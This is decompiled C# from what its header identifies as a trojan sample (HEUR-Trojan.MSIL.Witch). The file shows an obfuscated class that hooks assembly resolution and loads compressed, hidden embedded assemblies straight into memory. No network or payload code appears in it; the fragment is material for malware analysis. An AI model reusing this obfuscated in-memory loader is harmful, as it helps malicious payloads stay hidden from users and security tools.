// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.h
// Assembly: Kffxmjkup, Version=0.0.52.0, Culture=neutral, PublicKeyToken=null
// MVID: A3D42A33-7E04-4546-0720-DC34BF455AE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.Witch.gen-6bbdcec0763847706f9b75674aad231ff23afd2b212138fc630a86f69f8180d8.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;

namespace WindowsFormsApp1
{
  internal static class h
  {
    private static object a;
    private static Dictionary<string, bool> b;
    private static Dictionary<string, string> c;
    private static Dictionary<string, string> d;
    private static int e;

    static h()
    {
      object obj = new object();
      if (true)
        goto label_4;
label_1:
      Dictionary<string, bool> dictionary1 = new Dictionary<string, bool>();
      if (true)
        goto label_5;
label_2:
      Dictionary<string, string> dictionary2 = new Dictionary<string, string>();
      if (true)
        goto label_6;
label_3:
      h.d = new Dictionary<string, string>();
      h.c.Add(E.a(-588153881), E.a(-588153871));
      h.c.Add(E.a(-588153905), E.a(-588153951));
      return;
label_6:
      h.c = dictionary2;
      goto label_3;
label_5:
      h.b = dictionary1;
      goto label_2;
label_4:
      h.a = obj;
      goto label_1;
    }

    private static string a(CultureInfo a)
    {
      CultureInfo cultureInfo1 = a;
      if (true)
        ;
      if (cultureInfo1 == null)
        return string.Empty;
      CultureInfo cultureInfo2 = a;
      if (true)
        ;
      return cultureInfo2.Name;
    }

    private static Assembly a(AssemblyName a)
    {
      Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
      if (true)
        goto label_2;
label_1:
      int index;
      if (true)
        index = 0;
      Assembly[] assemblyArray;
      for (; index < assemblyArray.Length; ++index)
      {
        Assembly assembly1 = assemblyArray[index];
        if (true)
          goto label_6;
label_5:
        Assembly assembly2;
        AssemblyName name = assembly2.GetName();
        if (string.Equals(name.Name, a.Name, StringComparison.InvariantCultureIgnoreCase) && string.Equals(h.a(name.CultureInfo), h.a(a.CultureInfo), StringComparison.InvariantCultureIgnoreCase))
          return assembly2;
        continue;
label_6:
        assembly2 = assembly1;
        goto label_5;
      }
      return (Assembly) null;
label_2:
      assemblyArray = assemblies;
      goto label_1;
    }

    private static void a(Stream a, Stream b)
    {
      byte[] numArray = new byte[81920];
      byte[] buffer;
      if (true)
        buffer = numArray;
      while (true)
      {
        int num = a.Read(buffer, 0, buffer.Length);
        if (true)
          goto label_6;
label_4:
        int count;
        if (num != 0)
        {
          b.Write(buffer, 0, count);
          continue;
        }
        break;
label_6:
        count = num;
        goto label_4;
      }
    }

    private static Stream a(string a)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if (true)
        goto label_2;
label_1:
      Assembly assembly;
      if (!a.EndsWith(E.a(-588153977)))
        return assembly.GetManifestResourceStream(a);
      Stream manifestResourceStream = assembly.GetManifestResourceStream(a);
      Stream stream;
      if (true)
        stream = manifestResourceStream;
      try
      {
        DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
        DeflateStream a1;
        if (true)
          a1 = deflateStream;
        try
        {
          MemoryStream b = new MemoryStream();
          h.a((Stream) a1, (Stream) b);
          b.Position = 0L;
          return (Stream) b;
        }
        finally
        {
          a1.Dispose();
        }
      }
      finally
      {
        stream?.Dispose();
      }
label_2:
      assembly = executingAssembly;
      goto label_1;
    }

    private static Stream a(Dictionary<string, string> a, string b)
    {
      Dictionary<string, string> dictionary = a;
      if (true)
        ;
      string key = b;
      if (true)
        ;
      string str;
      ref string local = ref str;
      if (!dictionary.TryGetValue(key, out local))
        return (Stream) null;
      string a1 = str;
      if (true)
        ;
      return h.a(a1);
    }

    private static byte[] a(Stream a)
    {
      byte[] numArray = new byte[a.Length];
      if (true)
        goto label_2;
label_1:
      byte[] buffer;
      a.Read(buffer, 0, buffer.Length);
      return buffer;
label_2:
      buffer = numArray;
      goto label_1;
    }

    private static Assembly a(
      Dictionary<string, string> a,
      Dictionary<string, string> b,
      AssemblyName c)
    {
      string lowerInvariant = c.Name.ToLowerInvariant();
      if (true)
        goto label_2;
label_1:
      string b1;
      if (c.CultureInfo != null && !string.IsNullOrEmpty(c.CultureInfo.Name))
      {
        string str = c.CultureInfo.Name + E.a(-588153963) + b1;
        if (true)
          b1 = str;
      }
      Stream stream = h.a(a, b1);
      Stream a1;
      if (true)
        a1 = stream;
      byte[] rawAssembly;
      try
      {
        if (a1 == null)
          return (Assembly) null;
        rawAssembly = h.a(a1);
      }
      finally
      {
        a1?.Dispose();
      }
      using (Stream a2 = h.a(b, b1))
      {
        if (a2 != null)
        {
          byte[] rawSymbolStore = h.a(a2);
          return Assembly.Load(rawAssembly, rawSymbolStore);
        }
      }
      return Assembly.Load(rawAssembly);
label_2:
      b1 = lowerInvariant;
      goto label_1;
    }

    public static Assembly a(object a, ResolveEventArgs b)
    {
      object a1 = h.a;
      if (true)
        goto label_2;
label_1:
      bool flag;
      if (true)
        flag = false;
      object obj1;
      try
      {
        object obj2 = obj1;
        ref bool local = ref flag;
        if (true)
          goto label_6;
label_5:
        if (h.b.ContainsKey(b.Name))
          return (Assembly) null;
        goto label_11;
label_6:
        Monitor.Enter(obj2, ref local);
        goto label_5;
      }
      finally
      {
        if (flag)
          Monitor.Exit(obj1);
      }
label_11:
      AssemblyName assemblyName = new AssemblyName(b.Name);
      Assembly assembly1 = h.a(assemblyName);
      if (assembly1 != (Assembly) null)
        return assembly1;
      Assembly assembly2 = h.a(h.c, h.d, assemblyName);
      if (assembly2 == (Assembly) null)
      {
        lock (h.a)
          h.b[b.Name] = true;
        if ((assemblyName.Flags & AssemblyNameFlags.Retargetable) != AssemblyNameFlags.None)
          assembly2 = Assembly.Load(assemblyName);
      }
      return assembly2;
label_2:
      obj1 = a1;
      goto label_1;
    }

    public static void a()
    {
      if (Interlocked.Exchange(ref h.e, 1) == 1)
        return;
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(h.a);
    }
  }
}
